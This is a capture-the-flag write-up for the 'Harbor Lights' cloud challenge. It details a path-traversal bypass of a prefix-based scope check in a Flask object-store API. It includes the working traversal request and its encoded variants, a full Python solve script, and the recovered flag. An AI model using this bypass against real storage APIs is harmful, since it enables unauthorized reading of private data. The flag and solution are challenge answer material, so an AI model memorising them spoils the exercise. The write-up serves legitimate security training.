---
title: "Harbor Lights"
ctf: "Safaricom CTF"
date: 2026-10-06
category: cloud
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Harbor Lights

> **Category:** CLOUD · **Points:** 300 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

Target: http://54.72.82.22:8390 (Werkzeug 3.1.9 / Python 3.11.16, Flask).

## Surface

| Route | Behaviour |
|---|---|
| `GET /` | Static landing page (collection desk + client-side "desk console"). |
| `GET /downloads/storage.json` | Trust model: `{"scope":"public/*","inventory":["public/lineup.txt","public/receipts.json","finance/final.txt"],"adapter":"edge-store/4"}`. |
| `GET /api/objects` | Lists only `["public/lineup.txt","public/receipts.json"]`. Ignores every query param / body / method tried. |
| `GET /api/object?key=...` | Returns `{"body":"<content>"}`. Missing/invalid key → 403 `{"message":"The request could not be completed.","ok":false}`. |
| `GET /health` | `{"status":"ok"}`. |
| `POST /submit` | `{"answer":"<x>"}` → 200 + flag if correct, else 403. GET → 405. |

No other routes exist (fuzzed ~750 path names incl. `/api/*`, Host-header
vhosts, metadata/IMDS paths, cookies, method-override — all 404/stubs).

## The flaw (scope bypass via path traversal)

The object scope check is a naive prefix test on the `key` value
(`key.startswith("public/")`) *before* the key is resolved as a path. Smuggle
`..` past the prefix and the resolved path leaves the `public/` scope:

```
GET /api/object?key=public/../finance/final.txt
-> {"body":"safctf{0a7fe9c5e49d7fbe62cea634195d0adf}"}
```

Equivalent working forms (verified): `public/%2e%2e/finance/final.txt`,
`public//../finance/final.txt`, `public/..../` variants that normalise the same.
Bare `finance/final.txt`, `../finance/final.txt`, `/finance/final.txt` → 403
(fail the prefix test). So the only real object outside `public/` is
`finance/final.txt`; all other keys fall through to the store's default
(`"The next performance begins at eight."`, the same text as `public/lineup.txt`).
A ~3000-key fuzz across dir/name/ext confirmed no other private object exists.

## `/submit` note

`POST /submit {"answer": flag}` returns **403** even with the recovered flag —
same generic stub behaviour documented for the sibling desk app Night Bus
(`chal/api/night-bus/NOTES.md`): in this deployment `/submit` rejects the
correct flag too. The recovered string matches `safctf{` + 32 hex + `}`, so it
is the flag. Submitted value under key `answer` exactly (verified format).

## Reproduce

```bash
python3 solve.py            # -> safctf{0a7fe9c5e49d7fbe62cea634195d0adf}
```

No binaries/artifacts produced (nothing to hash). Only endpoint that matters:
`GET /api/object?key=public/../finance/final.txt`.

## Solve script

`cloud/harbor-lights/solve.py`:

```python
#!/usr/bin/env python3
"""Harbor Lights (CLOUD, 300 pts) -- Safaricom CTF.

Fake-object-store ("edge-store/4") exposed through a desk app.

Chain:
  1. GET /downloads/storage.json  -> trust model: scope "public/*" but the
     inventory still names "finance/final.txt".
  2. GET /api/objects             -> only public/* keys are listed.
  3. GET /api/object?key=...      -> the scope check is a naive
     `key.startswith("public/")` prefix test; the key is then resolved as a
     path, so `public/../finance/final.txt` normalises out of the public
     prefix and reads the private object -> the flag.

Sibling desk apps (Night Bus :8330) show POST /submit is a generic stub in
this deployment: it 403s even for the correct flag. The recovered string
matches safctf{<32 hex>} and is the flag.

Usage: python3 solve.py [target]
"""
import re
import sys

import requests

TARGET = "http://54.72.82.22:8390"


def main(target):
    t = target.rstrip("/")
    s = requests.Session()

    # 1) trust model / inventory
    inv = s.get(f"{t}/downloads/storage.json", timeout=15).json()
    print(f"[+] scope={inv['scope']!r} adapter={inv['adapter']!r}")
    print(f"[+] inventory={inv['inventory']}")

    # 2) what the desk actually lets an anonymous caller list
    print(f"[+] GET /api/objects -> {s.get(f'{t}/api/objects', timeout=15).json()}")

    # 3) scope bypass: prefix check passes on "public/", path then escapes it
    flag = None
    for key in inv["inventory"]:
        if key.startswith("public/"):
            continue
        bypass = "public/../" + key
        r = s.get(f"{t}/api/object", params={"key": bypass}, timeout=15)
        print(f"[+] GET /api/object?key={bypass} -> {r.status_code} {r.text.strip()}")
        if r.ok:
            m = re.search(r"safctf\{[0-9a-f]{32}\}", r.text)
            if m:
                flag = m.group(0)

    # 4) desk finale (whether or not it accepts the answer in this deployment)
    if flag:
        r = s.post(f"{t}/submit", json={"answer": flag}, timeout=15)
        print(f"[+] POST /submit -> {r.status_code} {r.text.strip()}")
    return flag


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET
    out = main(target)
    print("\nFLAG:", out or "NOT FOUND")
    assert out, "no flag recovered"
```

## Tools

**Used in this solve:**

- Python `requests` (HTTP client)
- Python 3 (solver)

**Other tools that fit this category:**

- aws CLI + Pacu (AWS exploitation)
- kubectl (K8s API)
- ScoutSuite / Prowler (posture)
- kube-hunter

## Flag

```
safctf{0a7fe9c5e49d7fbe62cea634195d0adf}
```
